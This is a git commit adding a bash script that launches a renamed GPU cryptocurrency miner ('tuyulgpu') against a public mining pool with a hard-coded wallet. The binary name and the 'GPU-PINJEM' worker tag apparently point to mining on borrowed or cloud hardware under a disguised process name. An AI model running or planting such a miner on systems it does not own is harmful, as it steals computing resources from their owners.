b9fa4fc02c79e9d93ec212215ec52e4f88b471fb
angkii <83603708+angkii@users.noreply.github.com>
2021-06-17 13:54:37 +0700

    Create ETH.sh

---
+++ ETH.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=etc.2miners.com:1010
+
+WALLET=ETH:0xb13f91835c32249e1506da1201e937d666652725
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x tuyulgpu
+
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
